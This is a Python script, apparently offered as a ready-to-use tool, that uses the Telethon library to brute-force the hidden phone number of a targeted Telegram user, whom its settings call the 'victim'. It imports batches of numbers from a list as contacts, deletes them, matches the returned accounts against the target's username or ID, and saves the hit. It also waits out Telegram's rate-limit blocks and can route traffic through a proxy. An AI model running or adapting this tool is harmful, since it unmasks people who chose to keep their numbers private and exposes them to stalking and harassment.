### Compulsory settings
phone = '123456789012'                              # TODO: Your phone number
api_id = 1234567                                    # TODO: Your app api id
api_hash = '4964696F745365744170695F68617368'       # TODO: Your app api hash
numlist = "list.txt"                                # TODO: path to number list
username_or_id = 'graysuit'                         # TODO: victim username or user id. learn more: https://github.com/kotatogram/kotatogram-desktop/issues/274

### Optional settings
# proxy settings: Use MTPROTO proxy if telegram blocked in your country. All data is safe except IP. Get proxies at: https://t.me/ProxyMTProto
use_proxy = True                                    # Should use proxy ? Make True if yes.
proxy_server = 'firewall.firewall-gw.cam'           # DNS of proxy, ip or domain
proxy_secret = 'dd00000000000000000000000000000000' # Proxy secret, mostly hex encoded serves as password
proxy_port = 443                                    # Numeric port of proxy, normally 443

# script settings
should_resume = True                                # whether it should start reading numbers list from where left
threads = 19                                        # numbers to be tried on each try, don't increase else won't work
delay = 1                                           # delay in seconds on each try to prevent telegram blocks

import time,sys, os.path
from telethon import TelegramClient, events, sync, connection, functions, types
from telethon.tl.types import InputPhoneContact
from telethon.errors import FloodWaitError

def import_numbers(numbers):
    global delay, username_or_id
    while True:
        try:
            contact_list = []
            for number in numbers:
                new_contact = InputPhoneContact(client_id=0,phone=number, first_name="your friend",last_name="graysuit")
                contact_list.append(new_contact)
            contacts = client(functions.contacts.ImportContactsRequest(contact_list))
            if len(contacts.users) > 0:
                client(functions.contacts.DeleteContactsRequest(id=contacts.users))
                for user in contacts.users:
                    if username_or_id == str(user.id) or username_or_id == user.username:
                        print('Found:' + user.phone)
                        open('found.txt', 'a').write(str(user) + "\n")
                        sys.exit()
                    print("valid:" + str(user))
                    
            else:
                print(str(numbers))
            time.sleep(delay)    
            break    
        except FloodWaitError as e:
            print("Blocked for " + str(e.seconds) + " sec, waiting...")
            time.sleep(e.seconds + 1)

def brute_force():
    global threads,threads,numlist,should_resume
    current = 0
    current_numbers = []
    index = 0
    old_index = 1
    if should_resume:
        if os.path.isfile('index.txt'):
            old_index = int(open("index.txt", "r").read())
    with open(numlist) as phone_numbers:
        for number in phone_numbers:
            index += 1
            if should_resume:
                if not index == old_index:
                    continue
                should_resume = False   
            number = number.strip()
            current += 1
            current_numbers.append(number)
            if current >= threads:
                import_numbers(current_numbers)
                current_numbers.clear()
                current = 0
                open('index.txt', 'w').write(str(index)) 
        if len(current_numbers) > 0:
            import_numbers(current_numbers)

### Entry Point
client = None
if use_proxy:
    proxy_connect = connection.ConnectionTcpMTProxyRandomizedIntermediate
    client = TelegramClient(phone, api_id, api_hash, connection=proxy_connect, proxy=(proxy_server, proxy_port, proxy_secret))
else:
    client = TelegramClient(phone, api_id, api_hash)
client.connect()
if not client.is_user_authorized():
    client.send_code_request(phone)
    client.sign_in(phone, input('Enter code:'))
brute_force()